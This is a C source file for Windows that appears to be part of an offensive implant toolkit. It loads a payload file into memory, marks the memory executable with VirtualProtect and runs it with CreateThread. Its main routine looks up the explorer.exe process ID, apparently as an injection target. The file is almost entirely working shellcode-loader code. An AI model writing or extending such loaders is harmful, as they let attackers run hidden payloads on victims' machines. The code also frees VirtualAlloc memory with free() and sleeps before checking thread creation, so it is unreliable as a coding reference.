#include <stdio.h>

#include <windows.h>

#include "libProc.h"
#include "libCrypt.h"
#include "libInject.h"
#include "libError.h"
#include "libDebug.h"

int getPayload(char* pathToPayload, char** payloadData, int* payloadLen){
	DPRINT("getPayload\n");
	int retVal = 0;

	FILE* payloadFile = NULL;
	payloadFile = fopen(pathToPayload, "rb");
	CHECK_RETVAL_NV(retVal, "fopen", payloadFile, NULL, FILE_ERROR_OPEN);

	fseek(payloadFile, 0L, SEEK_END); //find the end of the file
	*payloadLen = ftell(payloadFile); // see what position we're at
	CHECK_RETVAL_NV(retVal, "fseek/ftell", *payloadLen, 0, FILE_ERROR_READ);
	/*if(!payloadLen) {
		retVal = *payloadLen;
		CHECK_RETVAL(retVal, "ftell", FILE_ERROR_READ);
	}*/ // zero size files are no good
	fseek(payloadFile, 0L, SEEK_SET); // go back to the beginning of the file

	*payloadData = VirtualAlloc(NULL, *payloadLen, 0x3000, PAGE_READWRITE);
	CHECK_RETVAL_GLE(retVal, "VirtualAlloc", *payloadData, NULL);
	/*if(!*payloadData) {
		retVal = ALLOC_ERROR;
		CHECK_RETVAL(retVal, "VirtualAlloc", ALLOC_ERROR);
	}*/

	retVal = fread(*payloadData, sizeof(char), *payloadLen, payloadFile);
	CHECK_RETVAL_NV(retVal, "fread", retVal, *payloadLen, FILE_ERROR_READ);
	/*if(retVal != *payloadLen){
		DPRINT("Read %d bytes. Wanted %d bytes.\n", retVal, *payloadLen);
		retVal = FILE_ERROR_READ;
		CHECK_RETVAL(retVal, "fread", FILE_ERROR_READ);
	}*/

	retVal = NO_ERROR; // clear the result from fread out

CLEANUP:
	if(payloadFile) { fclose(payloadFile); payloadFile = NULL; }
	if(*payloadData && retVal) { free(*payloadData); *payloadData = NULL; }
	return retVal;
}

int processPayload(char* payloadData, int payloadLen){
	DPRINT("processPayload\n");
	int retVal = 0;
	DWORD oldProtect = 0;

	retVal = VirtualProtect(payloadData, payloadLen, PAGE_EXECUTE_READ, &oldProtect);
	CHECK_RETVAL_GLE(retVal, "VirtualProtect", retVal, 0);
	
	retVal = NO_ERROR;

CLEANUP:
	return retVal;
}

int runPayload(char* payloadData, HANDLE* implantHandle){
	DPRINT("runPayload\n");

	int retVal = 0;

	*implantHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payloadData, NULL, 0, 0);
	Sleep(1000); // Wait a bit for the thread to kick off
	CHECK_RETVAL_GLE(retVal, "CreateThread", *implantHandle, NULL);
	/*if(!*implantHandle){
		retVal = EXEC_ERROR_RUN;
		CHECK_RETVAL(retVal, "CreateThread", retVal);
	}*/

	DPRINT("Success");
CLEANUP:
	return retVal;
}

int findProcess();

int main(){
    int retVal = NO_ERROR;
	int pid = 0;

	retVal = GetPidByName(L"explorer.exe", &pid);
	CHECK_RETVAL(retVal, "GetPidByName");

	printf("PID: %d\n", pid);

CLEANUP:
    return retVal;
};
